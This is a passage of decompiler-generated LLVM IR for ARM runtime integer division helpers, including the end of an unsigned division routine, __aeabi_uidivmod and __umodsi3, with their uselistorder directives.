  %v0_13380.pr = phi i32 [ %v0_13380.pr38, %dec_label_pc_13380thread-pre-split.loopexit ], [ %v3_13388, %bb85 ]
  br label %dec_label_pc_13380

dec_label_pc_13380.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_13380

dec_label_pc_13380:                               ; preds = %dec_label_pc_13380.loopexit, %dec_label_pc_13380thread-pre-split
  %v1_1338c = phi i32 [ %v1_1338c46, %dec_label_pc_13380thread-pre-split ], [ %v1_13378, %dec_label_pc_13380.loopexit ]
  %v1_13388 = phi i32 [ %v0_13380.pr, %dec_label_pc_13380thread-pre-split ], [ %v4_13374, %dec_label_pc_13380.loopexit ]
  %v2_13380 = icmp slt i32 %v1_13388, 0
  br i1 %v2_13380, label %dec_label_pc_13394, label %bb84

bb84:                                             ; preds = %dec_label_pc_13380
  %v4_13384 = icmp ult i32 %v1_13388, %v0_1334c
  br i1 %v4_13384, label %bb85, label %dec_label_pc_13394

bb85:                                             ; preds = %bb84
  %v3_13388 = mul i32 %v1_13388, 2
  %v2_1338c = icmp slt i32 %v1_1338c, 0
  %v3_1338c = mul i32 %v1_1338c, 2
  br i1 %v2_1338c, label %dec_label_pc_13394, label %dec_label_pc_13380thread-pre-split

dec_label_pc_13394:                               ; preds = %bb84, %dec_label_pc_13380, %bb85
  %v2_133a059 = phi i32 [ %v3_1338c, %bb85 ], [ %v1_1338c, %bb84 ], [ %v1_1338c, %dec_label_pc_13380 ]
  %v1_1339851 = phi i32 [ %v3_13388, %bb85 ], [ %v1_13388, %bb84 ], [ %v1_13388, %dec_label_pc_13380 ]
  br label %dec_label_pc_13398

dec_label_pc_13398:                               ; preds = %.thread11, %dec_label_pc_13394
  %v1_133cc = phi i32 [ %v4_133cc, %.thread11 ], [ %v2_133a059, %dec_label_pc_13394 ]
  %v1_133a0 = phi i32 [ %v0_133d8, %.thread11 ], [ 0, %dec_label_pc_13394 ]
  %v1_133d0 = phi i32 [ %v4_133d0, %.thread11 ], [ %v1_1339851, %dec_label_pc_13394 ]
  %v1_1339c = phi i32 [ %v0_133c8, %.thread11 ], [ %v0_1334c, %dec_label_pc_13394 ]
  %v3_13398 = icmp ult i32 %v1_1339c, %v1_133d0
  br i1 %v3_13398, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_13398
  %v3_1339c = sub i32 %v1_1339c, %v1_133d0
  %v3_133a0 = or i32 %v1_133a0, %v1_133cc
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13398, %bb86
  %v1_133a8 = phi i32 [ %v1_1339c, %dec_label_pc_13398 ], [ %v3_1339c, %bb86 ]
  %v1_133ac = phi i32 [ %v1_133a0, %dec_label_pc_13398 ], [ %v3_133a0, %bb86 ]
  %v4_133a4 = udiv i32 %v1_133d0, 2
  %v6_133a4 = icmp ult i32 %v1_133a8, %v4_133a4
  br i1 %v6_133a4, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_133a8 = urem i32 %v1_133d0, 2
  %v4_133a8 = icmp eq i32 %v3_133a8, 0
  %v6_133a8 = sub i32 %v1_133a8, %v4_133a4
  br i1 %v4_133a8, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_133ac = udiv i32 %v1_133cc, 2
  %v6_133ac = or i32 %v1_133ac, %v5_133ac
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_133b4 = phi i32 [ %v6_133a8, %bb87 ], [ %v1_133a8, %.thread7 ], [ %v6_133a8, %bb88 ]
  %v1_133b8 = phi i32 [ %v1_133ac, %bb87 ], [ %v1_133ac, %.thread7 ], [ %v6_133ac, %bb88 ]
  %v4_133b0 = udiv i32 %v1_133d0, 4
  %v6_133b0 = icmp ult i32 %v1_133b4, %v4_133b0
  br i1 %v6_133b0, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_133b4 = and i32 %v1_133d0, 2
  %v4_133b4 = icmp eq i32 %v3_133b4, 0
  %v6_133b4 = sub i32 %v1_133b4, %v4_133b0
  br i1 %v4_133b4, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_133b8 = udiv i32 %v1_133cc, 4
  %v6_133b8 = or i32 %v1_133b8, %v5_133b8
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_133c0 = phi i32 [ %v6_133b4, %bb89 ], [ %v1_133b4, %.thread8 ], [ %v6_133b4, %bb90 ]
  %v1_133c4 = phi i32 [ %v1_133b8, %bb89 ], [ %v1_133b8, %.thread8 ], [ %v6_133b8, %bb90 ]
  %v4_133bc = udiv i32 %v1_133d0, 8
  %v6_133bc = icmp ult i32 %v1_133c0, %v4_133bc
  br i1 %v6_133bc, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_133c0 = and i32 %v1_133d0, 4
  %v4_133c0 = icmp eq i32 %v3_133c0, 0
  %v6_133c0 = sub i32 %v1_133c0, %v4_133bc
  br i1 %v4_133c0, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_133c4 = udiv i32 %v1_133cc, 8
  %v6_133c4 = or i32 %v1_133c4, %v5_133c4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_133d8 = phi i32 [ %v1_133c4, %bb91 ], [ %v1_133c4, %.thread9 ], [ %v6_133c4, %bb92 ]
  %v0_133c8 = phi i32 [ %v6_133c0, %bb91 ], [ %v1_133c0, %.thread9 ], [ %v6_133c0, %bb92 ]
  %v2_133c8 = icmp eq i32 %v0_133c8, 0
  br i1 %v2_133c8, label %dec_label_pc_133d8, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_133cc, 16
  br i1 %tmp140, label %dec_label_pc_133d8, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_133cc = udiv i32 %v1_133cc, 16
  %v4_133d0 = udiv i32 %v1_133d0, 16
  br label %dec_label_pc_13398

dec_label_pc_133d8:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_133d8

dec_label_pc_133e0:                               ; preds = %dec_label_pc_1334c
  %v9_1334c = icmp eq i32 %v0_1334c, %arg2
  %. = zext i1 %v9_1334c to i32
  ret i32 %.

dec_label_pc_133ec:                               ; preds = %dec_label_pc_13354
  %v2_133ec = icmp ugt i32 %arg2, 65535
  br i1 %v2_133ec, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_133ec
  %v2_133f0 = and i32 %arg2, 32768
  %v3_133f0 = icmp eq i32 %v2_133f0, 0
  %v4_133f0 = udiv i32 %arg2, 65536
  br i1 %v3_133f0, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_133ec
  %v0_133fc65 = phi i32 [ %arg2, %dec_label_pc_133ec ], [ %v4_133f0, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_13400 = phi i32 [ %v0_133fc65, %.thread16 ], [ %v4_133f0, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_133fc = icmp ugt i32 %v1_13400, 255
  br i1 %v2_133fc, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_13400 = and i32 %v1_13400, 128
  %v3_13400 = icmp eq i32 %v2_13400, 0
  %v4_13400 = udiv i32 %v1_13400, 256
  br i1 %v3_13400, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_13404 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_13410 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_13404, %bb100 ]
  %v1_1340c = phi i32 [ %v1_13400, %bb98 ], [ %v4_13400, %bb99 ], [ %v4_13400, %bb100 ]
  %v2_13408 = icmp ugt i32 %v1_1340c, 15
  br i1 %v2_13408, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_1340c = and i32 %v1_1340c, 8
  %v3_1340c = icmp eq i32 %v2_1340c, 0
  %v4_1340c = udiv i32 %v1_1340c, 16
  br i1 %v3_1340c, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_13410 = add nsw i32 %v1_13410, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_13418 = phi i32 [ %v1_13410, %.thread17 ], [ %v1_13410, %bb101 ], [ %v2_13410, %bb102 ]
  %v5_1341c = phi i32 [ %v1_1340c, %.thread17 ], [ %v4_1340c, %bb101 ], [ %v4_1340c, %bb102 ]
  %v2_13414 = icmp ugt i32 %v5_1341c, 3
  %v7_13414 = icmp eq i32 %v5_1341c, 4
  %v2_13418 = xor i1 %v7_13414, true
  %v3_13418 = and i1 %v2_13414, %v2_13418
  br i1 %v3_13418, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_13418 = add nsw i32 %v4_13418, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_1341c = phi i32 [ %v4_13418, %.thread18 ], [ %v5_13418, %bb103 ]
  %v2_1341c = xor i1 %v2_13414, true
  %v3_1341c = or i1 %v7_13414, %v2_1341c
  br i1 %v3_1341c, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_1341c = udiv i32 %v5_1341c, 2
  %v9_1341c = add i32 %v4_1341c, %v8_1341c
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_13420 = phi i32 [ %v4_1341c, %bb104 ], [ %v9_1341c, %bb105 ]
  %v6_13420 = lshr i32 %v0_1334c, %v1_13420
  ret i32 %v6_13420

dec_label_pc_13428:                               ; preds = %bb80
  %v0_13428 = load i32, i32* @lr, align 4
  %v0_1342c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13428)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1341c, { 1, 0 }
  uselistorder i1 %v7_13414, { 1, 0 }
  uselistorder i32 %v4_1340c, { 1, 0 }
  uselistorder i32 %v1_1340c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13400, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_13400, { 1, 0, 2, 3 }
  uselistorder i32 %v4_133f0, { 1, 0 }
  uselistorder i32 %v0_133c8, { 1, 0 }
  uselistorder i32 %v4_133bc, { 1, 0 }
  uselistorder i32 %v1_133c4, { 1, 2, 0 }
  uselistorder i32 %v4_133b0, { 1, 0 }
  uselistorder i32 %v1_133b8, { 1, 2, 0 }
  uselistorder i32 %v4_133a4, { 1, 0 }
  uselistorder i32 %v1_133ac, { 1, 2, 0 }
  uselistorder i32 %v1_133d0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_133a0, { 1, 0 }
  uselistorder i32 %v1_133cc, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1338c, { 1, 0 }
  uselistorder i32 %v3_13388, { 1, 0 }
  uselistorder i32 %v1_13388, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1338c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13378, { 1, 0 }
  uselistorder i32 %v4_13374, { 2, 1, 0 }
  uselistorder i32 %v1_13378, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13380.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_1334c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i1 true, { 0, 1, 52, 2, 3, 4, 5, 6, 106, 47, 53, 59, 83, 60, 107, 10, 11, 12, 84, 75, 85, 86, 87, 54, 13, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 14, 15, 104, 105, 74, 50, 8, 9, 73, 7, 108, 17, 16, 61, 68, 62, 69, 57, 67, 58, 72, 109, 18, 110, 111, 19, 20, 21, 112, 76, 77, 22, 23, 113, 78, 79, 24, 25, 114, 80, 81, 26, 27, 56, 115, 116, 70, 117, 48, 63, 28, 49, 29, 30, 31, 64, 32, 55, 33, 34, 35, 36, 37, 38, 118, 119, 120, 121, 65, 122, 123, 124, 125, 126, 127, 128, 129, 43, 130, 44, 45, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 42, 145, 146, 147, 148, 149, 150, 41, 151, 51, 152, 66, 71, 46, 153, 39, 40, 82, 154 }
  uselistorder i32 15, { 7, 3, 0, 8, 4, 5, 1, 9, 10, 6, 11, 12, 13, 14, 2, 15 }
  uselistorder i32 256, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 11, 12, 13, 9, 10, 14, 15, 16, 17, 18, 357, 358, 19, 20, 21, 22, 23, 24, 25, 359, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 38, 39, 43, 42, 41, 44, 356, 360, 49, 45, 48, 46, 47, 354, 50, 51, 52, 55, 54, 53, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 77, 83, 78, 74, 75, 79, 80, 81, 84, 76, 85, 86, 82, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 99, 100, 98, 101, 104, 105, 103, 102, 106, 109, 108, 107, 110, 116, 113, 117, 114, 111, 118, 112, 119, 115, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 137, 136, 138, 139, 140, 151, 146, 141, 152, 147, 153, 154, 148, 155, 149, 142, 143, 144, 156, 145, 157, 150, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 180, 179, 184, 185, 181, 188, 186, 182, 189, 187, 183, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 207, 206, 205, 208, 210, 215, 216, 211, 217, 212, 209, 218, 213, 214, 219, 220, 221, 222, 223, 224, 225, 228, 229, 226, 230, 227, 232, 231, 233, 234, 235, 236, 237, 240, 241, 244, 242, 238, 245, 243, 239, 248, 247, 246, 355, 361, 249, 250, 256, 251, 257, 252, 253, 258, 254, 259, 260, 255, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 280, 279, 281, 282, 286, 287, 294, 288, 289, 295, 290, 283, 284, 296, 291, 285, 292, 293, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 312, 311, 313, 314, 318, 319, 326, 320, 321, 327, 322, 315, 316, 328, 323, 317, 324, 325, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 346, 345, 347, 348, 349, 350, 351, 352, 353 }
  uselistorder i32 128, { 13, 14, 15, 21, 2, 22, 16, 17, 18, 19, 23, 3, 24, 4, 11, 12, 25, 26, 6, 0, 1, 7, 8, 9, 27, 5, 28, 20, 10 }
  uselistorder i32 255, { 14, 15, 2, 16, 3, 17, 4, 18, 0, 1, 7, 19, 8, 20, 5, 21, 6, 22, 11, 23, 12, 24, 9, 25, 10, 26, 13, 27 }
  uselistorder i32 65536, { 5, 6, 7, 8, 9, 10, 1, 12, 11, 13, 2, 14, 0, 3, 15, 16, 17, 18, 19, 22, 20, 21, 23, 24, 25, 30, 31, 32, 33, 26, 27, 28, 29, 34, 37, 38, 39, 35, 36, 40, 44, 45, 46, 41, 42, 43, 47, 48, 4, 50, 51, 49, 52, 53, 54, 57, 58, 59, 55, 56, 60, 62, 63, 64, 61, 65, 67, 66, 68, 70, 69, 72, 71, 73, 74, 77, 78, 79, 75, 76, 80, 81, 84, 85, 86, 82, 83, 88, 87 }
  uselistorder i32 32768, { 1, 0 }
  uselistorder i32 65535, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_133d8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13394, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13380thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1343c = udiv i32 %arg1, %arg2
  ret i32 %v2_1343c
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13450 = add i32 %arg2, -1
  %v2_13450 = icmp eq i32 %arg2, 0
  br i1 %v2_13450, label %dec_label_pc_1350c, label %dec_label_pc_13458

dec_label_pc_13458:                               ; preds = %entry
  %v7_13450 = icmp eq i32 %arg2, 1
  br i1 %v7_13450, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_13458
  %v1_13458 = load i32, i32* @r0, align 4
  %v10_13458 = icmp eq i32 %v1_13458, %arg2
  br i1 %v10_13458, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_13458, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_13458 = icmp ult i32 %v1_13458, %arg2
  br i1 %v4_13458, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_13460 = and i32 %v1_13450, %arg2
  %v8_13460 = icmp eq i32 %v6_13460, 0
  br i1 %v8_13460, label %.thread67, label %dec_label_pc_13470.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_13464 = phi i32 [ %v1_13458, %bb75 ], [ 0, %.thread65 ]
  %v3_13464 = and i32 %v1_13464, %v1_13450
  br label %bb76

dec_label_pc_13470.preheader:                     ; preds = %bb75
  %v2_1347099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1347099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_13500, %bb74, %bb89, %bb84, %dec_label_pc_134d0, %.thread67
  %v5_13468 = phi i32 [ %v1_13458, %bb74 ], [ %v3_13464, %.thread67 ], [ %v1_134ac.v6_134ac.v6_134b4.v6_134bc, %dec_label_pc_134d0 ], [ 0, %bb84 ], [ %v1_13504, %dec_label_pc_13500 ], [ %v2_13500, %bb89 ]
  ret i32 %v5_13468

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_13470.preheader
  %v0_13484.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_13470.preheader ], [ %v4_13478, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_13470.preheader ], [ %v2_1347c11, %.thread1.thread9 ]
  br label %dec_label_pc_13484thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_13470.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1347c11, %.thread1.thread9 ], [ 0, %dec_label_pc_13470.preheader ]
  %v0_13484.pr33100 = phi i32 [ %v4_13478, %.thread1.thread9 ], [ %arg2, %dec_label_pc_13470.preheader ]
  %v4_13474 = icmp ult i32 %v0_13484.pr33100, %v1_13458
  br i1 %v4_13474, label %bb78, label %dec_label_pc_13484thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_13478 = and i32 %v0_13484.pr33100, 268435456
  %v3_13478 = icmp eq i32 %v2_13478, 0
  %v4_13478 = mul i32 %v0_13484.pr33100, 16
  br i1 %v3_13478, label %.thread1.thread9, label %dec_label_pc_13484.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1347c11 = add i32 %storemerge101, 4
  %v2_13470 = icmp ugt i32 %v4_13478, 268435455
  br i1 %v2_13470, label %.thread, label %bb77

dec_label_pc_13484thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_13484thread-pre-split.loopexit

dec_label_pc_13484thread-pre-split.loopexit:      ; preds = %dec_label_pc_13484thread-pre-split.loopexit.loopexit, %.thread
  %v0_13484.pr3398 = phi i32 [ %v0_13484.pr33.lcssa, %.thread ], [ %v0_13484.pr33100, %dec_label_pc_13484thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_13484thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13484thread-pre-split

dec_label_pc_13484thread-pre-split:               ; preds = %.thread4, %dec_label_pc_13484thread-pre-split.loopexit
  %v1_1349039 = phi i32 [ %storemerge95, %dec_label_pc_13484thread-pre-split.loopexit ], [ %v2_13490, %.thread4 ]
  %v0_13484.pr = phi i32 [ %v0_13484.pr3398, %dec_label_pc_13484thread-pre-split.loopexit ], [ %v3_1348c, %.thread4 ]
  br label %dec_label_pc_13484

dec_label_pc_13484.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_13484

dec_label_pc_13484:                               ; preds = %dec_label_pc_13484.loopexit, %dec_label_pc_13484thread-pre-split
  %v0_13498.pr = phi i32 [ %v1_1349039, %dec_label_pc_13484thread-pre-split ], [ %storemerge101, %dec_label_pc_13484.loopexit ]
  %v1_1348c = phi i32 [ %v0_13484.pr, %dec_label_pc_13484thread-pre-split ], [ %v4_13478, %dec_label_pc_13484.loopexit ]
  %v2_13484 = icmp slt i32 %v1_1348c, 0
  br i1 %v2_13484, label %dec_label_pc_13498, label %bb79

bb79:                                             ; preds = %dec_label_pc_13484
  %v4_13488 = icmp ult i32 %v1_1348c, %v1_13458
  br i1 %v4_13488, label %.thread4, label %dec_label_pc_13498

.thread4:                                         ; preds = %bb79
  %v3_1348c = mul i32 %v1_1348c, 2
  %v2_13490 = add i32 %v0_13498.pr, 1
  br label %dec_label_pc_13484thread-pre-split

dec_label_pc_13498:                               ; preds = %bb79, %dec_label_pc_13484
  %v2_13498 = add i32 %v0_13498.pr, -3
  %v5_1349c = icmp slt i32 %v0_13498.pr, 3
  br i1 %v5_1349c, label %dec_label_pc_134dc, label %dec_label_pc_134a0

dec_label_pc_134a0:                               ; preds = %dec_label_pc_13498, %bb83
  %v6_134c8 = phi i32 [ %v0_134d0, %bb83 ], [ %v2_13498, %dec_label_pc_13498 ]
  %v1_134a4 = phi i32 [ %v1_134ac.v6_134ac.v6_134b4.v6_134bc, %bb83 ], [ %v1_13458, %dec_label_pc_13498 ]
  %v3_134c412 = phi i32 [ %v3_134c4, %bb83 ], [ %v1_1348c, %dec_label_pc_13498 ]
  %v3_134a0 = icmp ult i32 %v1_134a4, %v3_134c412
  %v3_134a4 = select i1 %v3_134a0, i32 0, i32 %v3_134c412
  %v1_134ac = sub i32 %v1_134a4, %v3_134a4
  %v4_134a8 = udiv i32 %v3_134c412, 2
  %v6_134a8 = icmp ult i32 %v1_134ac, %v4_134a8
  %v6_134ac = select i1 %v6_134a8, i32 0, i32 %v4_134a8
  %v1_134ac.v6_134ac = sub i32 %v1_134ac, %v6_134ac
  %.demorgan = and i1 %v3_134a0, %v6_134a8
  %v4_134b0 = udiv i32 %v3_134c412, 4
  %v6_134b0 = icmp ult i32 %v1_134ac.v6_134ac, %v4_134b0
  %v6_134b4 = select i1 %v6_134b0, i32 0, i32 %v4_134b0
  %v1_134ac.v6_134ac.v6_134b4 = sub i32 %v1_134ac.v6_134ac, %v6_134b4
  %.demorgan71 = and i1 %.demorgan, %v6_134b0
  %v4_134b8 = udiv i32 %v3_134c412, 8
  %v6_134b8 = icmp ult i32 %v1_134ac.v6_134ac.v6_134b4, %v4_134b8
  %v6_134bc = select i1 %v6_134b8, i32 0, i32 %v4_134b8
  %v1_134ac.v6_134ac.v6_134b4.v6_134bc = sub i32 %v1_134ac.v6_134ac.v6_134b4, %v6_134bc
  %.demorgan72 = and i1 %.demorgan71, %v6_134b8
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_134a0
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_134a0, %bb80
  %v2_134c0 = add i32 %v1_134ac.v6_134ac.v6_134b4.v6_134bc, -1
  %v4_134c0 = sub i32 0, %v1_134ac.v6_134ac.v6_134b4.v6_134bc
  %v5_134c0 = and i32 %v1_134ac.v6_134ac.v6_134b4.v6_134bc, %v4_134c0
  %v3_134c4 = udiv i32 %v3_134c412, 16
  %v5_134c8 = icmp slt i32 %v1_134ac.v6_134ac.v6_134b4.v6_134bc, 1
  br i1 %v5_134c8, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_134c8 = add i32 %v6_134c8, -4
  %v9_134c8 = sub i32 3, %v6_134c8
  %v10_134c8 = and i32 %v9_134c8, %v6_134c8
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_134d0 = phi i32 [ %v6_134c8, %bb81 ], [ %v7_134c8, %bb82 ]
  %v0_134cc15.in = phi i32 [ %v2_134c0, %bb81 ], [ %v7_134c8, %bb82 ]
  %v1_134cc14.in = phi i32 [ %v5_134c0, %bb81 ], [ %v10_134c8, %bb82 ]
  %v1_134cc14 = icmp slt i32 %v1_134cc14.in, 0
  %v0_134cc15 = icmp slt i32 %v0_134cc15.in, 0
  %v2_134cc = xor i1 %v0_134cc15, %v1_134cc14
  br i1 %v2_134cc, label %dec_label_pc_134d0, label %dec_label_pc_134a0

dec_label_pc_134d0:                               ; preds = %bb83
  %v1_134d0 = urem i32 %v0_134d0, 4
  %v2_134d0 = icmp eq i32 %v1_134d0, 0
  br i1 %v2_134d0, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_134d0
  %v3_134d4 = icmp eq i32 %v1_134ac.v6_134ac.v6_134b4.v6_134bc, 0
  br i1 %v3_134d4, label %bb76, label %dec_label_pc_134dc

dec_label_pc_134dc:                               ; preds = %bb84, %dec_label_pc_13498
  %v0_134f0 = phi i32 [ %v3_134c4, %bb84 ], [ %v1_1348c, %dec_label_pc_13498 ]
  %v1_134ec = phi i32 [ %v1_134ac.v6_134ac.v6_134b4.v6_134bc, %bb84 ], [ %v1_13458, %dec_label_pc_13498 ]
  %v0_134dc = phi i32 [ %v0_134d0, %bb84 ], [ %v2_13498, %dec_label_pc_13498 ]
  %v5_134e0 = icmp slt i32 %v0_134dc, -2
  br i1 %v5_134e0, label %dec_label_pc_13500, label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134dc
  %v8_134dc = icmp eq i32 %v0_134dc, -2
  br i1 %v8_134dc, label %dec_label_pc_134f4, label %dec_label_pc_134e8

dec_label_pc_134e8:                               ; preds = %dec_label_pc_134e4
  %v3_134e8 = icmp ult i32 %v1_134ec, %v0_134f0
  br i1 %v3_134e8, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_134e8
  %v2_134e8 = sub i32 %v1_134ec, %v0_134f0
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_134e8, %bb85
  %v0_134f452 = phi i32 [ %v1_134ec, %dec_label_pc_134e8 ], [ %v2_134e8, %bb85 ]
  %v3_134f0 = udiv i32 %v0_134f0, 2
  br label %dec_label_pc_134f4

dec_label_pc_134f4:                               ; preds = %dec_label_pc_134e4, %bb86
  %v0_134fc = phi i32 [ %v0_134f0, %dec_label_pc_134e4 ], [ %v3_134f0, %bb86 ]
  %v1_134f8 = phi i32 [ %v1_134ec, %dec_label_pc_134e4 ], [ %v0_134f452, %bb86 ]
  %v3_134f4 = icmp ult i32 %v1_134f8, %v0_134fc
  br i1 %v3_134f4, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_134f4
  %v2_134f4 = sub i32 %v1_134f8, %v0_134fc
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_134f4, %bb87
  %v0_1350055 = phi i32 [ %v1_134f8, %dec_label_pc_134f4 ], [ %v2_134f4, %bb87 ]
  %v3_134fc = udiv i32 %v0_134fc, 2
  br label %dec_label_pc_13500

dec_label_pc_13500:                               ; preds = %dec_label_pc_134dc, %bb88
  %v2_13504 = phi i32 [ %v0_134f0, %dec_label_pc_134dc ], [ %v3_134fc, %bb88 ]
  %v1_13504 = phi i32 [ %v1_134ec, %dec_label_pc_134dc ], [ %v0_1350055, %bb88 ]
  %v3_13500 = icmp ult i32 %v1_13504, %v2_13504
  br i1 %v3_13500, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_13500
  %v2_13500 = sub i32 %v1_13504, %v2_13504
  br label %bb76

dec_label_pc_1350c:                               ; preds = %entry
  %v0_1350c = load i32, i32* @lr, align 4
  %v0_13510 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1350c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13504, { 1, 2, 0 }
  uselistorder i32 %v0_134f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_134d0, { 1, 0, 2 }
  uselistorder i32 %v7_134c8, { 1, 0 }
  uselistorder i32 %v3_134c4, { 1, 0 }
  uselistorder i32 %v1_134ac.v6_134ac.v6_134b4.v6_134bc, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_134b8, { 1, 0 }
  uselistorder i32 %v4_134b0, { 1, 0 }
  uselistorder i32 %v4_134a8, { 1, 0 }
  uselistorder i32 %v6_134c8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13498, { 1, 0 }
  uselistorder i32 %v1_1348c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_13478, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13484.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13458, { 4, 1, 5, 3, 0, 2, 6, 7 }
